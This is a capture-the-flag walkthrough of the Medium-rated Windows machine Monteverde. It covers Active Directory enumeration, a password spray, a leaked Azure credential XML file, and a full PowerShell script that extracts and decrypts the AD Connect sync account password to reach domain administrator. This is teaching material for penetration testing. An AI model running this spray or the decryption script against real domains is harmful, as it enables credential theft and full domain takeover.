# Monteverde

*Converted from: Monteverde.pdf*

---

# Monteverde

23 [d] March 2020 / Document No D20.100.64


Prepared By: TRX and egre55


Machine Author: egre55


Difficulty: Medium


Classification: Official


## **Synopsis**

Monteverde is a Medium Windows machine that features Azure AD Connect. The domain is enumerated

and a user list is created. Through password spraying, the SABatchJobs service account is found to have

the username as a password. Using this service account, it is possible to enumerate SMB Shares on the

system, and the $users share is found to be world-readable. An XML file used for an Azure AD account is

found within a user folder and contains a password. Due to password reuse, we can connect to the domain

controller as mhope using WinRM. Enumeration shows that Azure AD Connect is installed. It is possible to

extract the credentials for the account that replicates the directory changes to Azure (in this case the default

domain administrator).
### **Skills Required**


Basic Windows Enumeration

Basic Active Directory Enumeration
### **Skills Learned**


Password Spraying

Using sqlcmd

Azure AD Connect Password Extraction


## **Enumeration**
### **Nmap**



The scan reveals many ports open, including port 53 (DNS), 389 (LDAP) and 445 (SMB). This reveals that the

server is a domain controller. The domain is identified by Nmap as MEGABANK.LOCAL .
### **Domain Enumeration**


A good first step is to check for LDAP anonymous binds or SMB null sessions, as this would allow us to

enumerate the domain without credentials. Let's download windapsearch .





Next, issue the following command to check if LDAP anonymous binds are permitted.




We can also enumerate the domain users.


python windapsearch.py -u "" --dc-ip 10.10.10.172 -U --admin-objects


[+] No username provided. Will try anonymous bind.


[+] Using Domain Controller at: 10.10.10.172


[+] Getting defaultNamingContext from Root DSE


[+] Found: DC=MEGABANK,DC=LOCAL


[+] Attempting bind


[+] ...success! Binded as:


[+] None


[+] Enumerating all AD users


[+] Found 10 users:


cn: Guest


cn: AAD_987d7f2f57d2


cn: Mike Hope


userPrincipalName: mhope@MEGABANK.LOCAL


cn: SABatchJobs


userPrincipalName: SABatchJobs@MEGABANK.LOCAL


cn: svc-ata


userPrincipalName: svc-ata@MEGABANK.LOCAL


cn: svc-bexec


userPrincipalName: svc-bexec@MEGABANK.LOCAL


cn: svc-netapp


userPrincipalName: svc-netapp@MEGABANK.LOCAL


cn: Dimitris Galanos


userPrincipalName: dgalanos@MEGABANK.LOCAL


cn: Ray O'Leary


userPrincipalName: roleary@MEGABANK.LOCAL


cn: Sally Morgan


userPrincipalName: smorgan@MEGABANK.LOCAL


[+] Attempting to enumerate all admin (protected) objects


[+] Found 0 Admin Objects:


The output returns a few interesting users. SABatchJobs might be a service account dedicated to running

batch jobs, and is perhaps unusual for having a mixed-case name. The presence of the account

AAD_987d7f2f57d2 is a strong indication that AD Connect is installed in the domain. AD Connect is a tool

that is used to synchronize an on-premise Active Directory environment to Azure Active Directory.


[Using windapsearch we can further enumerate domain groups, and see which users belong to](https://raw.githubusercontent.com/ropnop/windapsearch/master/windapsearch.py) Remote

Management Users . This group allows its members to connect to computers using PowerShell Remoting.





The user mhope is identified to be in the Remote Management Users group.


Let's use smbclient to test for SMB null sessions. Command output reports that the anonymous login

attempt was successful, although it failed to list any shares. We can attempt to get credentials and access it

again.


Let's use enum4linux to retrieve other domain information.





We note that the Account Lockout Threshold is set to None, so we can attempt a password spray in

order to obtain valid credentials.


windapsearch can be used to create a list of domain users.


## **Foothold**

We have our user list, and for our password spraying attempt we can use a very short list of statistically

likely passwords. It's worth appending the discovered usernames to this list, as having a password of the

username is unfortunately a common practice.





Next, we can use CrackMapExec to perform the password spray, noting that there is no risk in the accounts

locking out owning to the absence of an account lockout policy.






This was successful and we have gained valid domain credentials: SABatchJobs / SABatchJobs . Let's see

if we can use this account to execute commands on the server.





This isn't successful. We can instead use smbmap to enumerate the remote file shares, which lists our

permissions.


Next, let's crawl the users$ share for potentially interesting files, such as Office documents, text and XML

files.


This reveals the file azure.xml, which is automatically downloaded.


cat 10.10.10.172-users_mhope_azure.xml


`��` <Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">


<Obj RefId="0">


<TN RefId="0">


<T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>


<T>System.Object</T>


</TN>


<ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>


<Props>


<DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>


<DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>


<G N="KeyId">00000000-0000-0000-0000-000000000000</G>


<S N="Password">4n0therD4y@n0th3r$</S>


</Props>


</Obj>


</Objs>


The file contains the Azure AD password 4n0therD4y@n0th3r$ . Let's check if mhope also uses this

password in the local AD. We can use WinRM to test the credentials, as we know this account is in the

Remote Management Users group.





This is successful, although the command whoami /priv reveals that the current user is not privileged.

However, whoami /groups reveals that this account is a member of the group MEGABANK\Azure Admins .


The user flag is in C:\Users\mhope\Desktop .


## **Privilege Escalation**

Navigating to C:\Program Files\ we can see that both Microsoft SQL Server and AD Connect are

installed. There are many articles published online regarding vulnerabilities and privilege escalation

opportunities with the Azure AD (AAD) Sync service.



Let's find out the version of the AD Connect. According to the Microsoft [documentation, the name of the](https://docs.microsoft.com/en-us/azure/active-directory/hybrid/concept-adsync-service-account)

service responsible for syncing the local AD to Azure AD is ADSync . We don't see a reference to this on

running Get-Process, and attempting to run tasklist results in an Access Denied error.


We can also try to enumerate services with the PowerShell cmdlet Get-Service, or by invoking wmic.exe

service get name, sc.exe query state= all or net.exe start, but are also denied access. Instead,

we can enumerate the service instance using the Registry.




This reveals that the service binary is C:\Program Files\Microsoft Azure AD Sync\Bin\miiserver.exe .


We can issue the command below to obtain the file (and product) version.


[Searching online reveals the adconnectdump tool, that can be used to extract the password for the AD](https://github.com/fox-it/adconnectdump)

Connect Sync Account. The repo mentions that the way that AD connect stores credentials changed a while

back. The new version stores credentials using DPAPI and the old version used the Registry. The [current](https://www.microsoft.com/en-us/download/details.aspx?id=47594)

version of AD Connect at the time of writing is 1.5.30.0, so the version on the server is unlikely to use

DPAPI. This tool works for newer versions of the AD Connect that use DPAPI.


Some further searching reveals [this](https://blog.xpnsec.com/azuread-connect-for-redteam/) blog post, which is recommended reading. It details the exploitation

process for the older version of AD Connect. Copy the script from the blog post and save it locally.


Attempting to run this as is was not successful. Let's try to extract the instance_id, keyset_id and

entropy values from the database manually. A default installation of AD Connect uses a SQL Server

Express instance as a LocalDB, connecting over a named pipe. However, enumeration of C:\Program

Files and netstat reveals that Microsoft SQL Server is installed and bound to 10.10.10.172 (but isn't

accessible externally). So this seems to have been a custom install of AD Connect.


Instead, we can use the native SQL Server utility sqlcmd.exe to extract the values from the database.



This is successful and the values are returned.


Modify the script to set the $key_id, $instance_id and $entropy variables to the values we extracted

from the database, and remove the commands that try to obtain them automatically. Add this after the first

line of the script.






Remove the following lines.



Next we will need to modify the existing $client variable to reference the custom SQL Server.





Let's encapsulate the script in a function that we can call. Save the final payload below as adconnect.ps1 .


Function Get-ADConnectPassword{


Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"


$key_id = 1


$instance_id = [GUID]"1852B527-DD4F-4ECF-B541-EFCCBFF29E31"


$entropy = [GUID]"194EC2FC-F186-46CF-B44D-071EB61F49CD"


$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList


"Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"


$client.Open()


$cmd = $client.CreateCommand()


$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM


mms_management_agent WHERE ma_type = 'AD'"


$reader = $cmd.ExecuteReader()


$reader.Read() | Out-Null


$config = $reader.GetString(0)


$crypted = $reader.GetString(1)


$reader.Close()


add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'


$km = New-Object -TypeName


Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager


$km.LoadKeySet($entropy, $instance_id, $key_id)


$key = $null


$km.GetActiveCredentialKey([ref]$key)


$key2 = $null


$km.GetKey(1, [ref]$key2)


$decrypted = $null


$key2.DecryptBase64ToString($crypted, [ref]$decrypted)


$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']"


| select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}


$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']"


| select @{Name = 'Username'; Expression = {$_.node.InnerXML}}


$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name =


'Password'; Expression = {$_.node.InnerXML}}


Write-Host ("Domain: " + $domain.Domain)


Write-Host ("Username: " + $username.Username)


Write-Host ("Password: " + $password.Password)


}


The -s flag in Evil-WinRM allows us to specify a folder containing PowerShell scripts. We can load a script

in memory within the Evil-WinRM session by typing the script name and hitting return.



This was successful, and we have obtained credentials for the AD Connect Sync account. In this case, as it

was a custom install, it seems the primary domain administrator was used for this. It's worth noting that a

default installation uses the NT SERVICE\ADSync service account.


Let's use Evil WinRM to connect as the administrator.




The root flag is located in C:\Users\Administrator\Desktop .


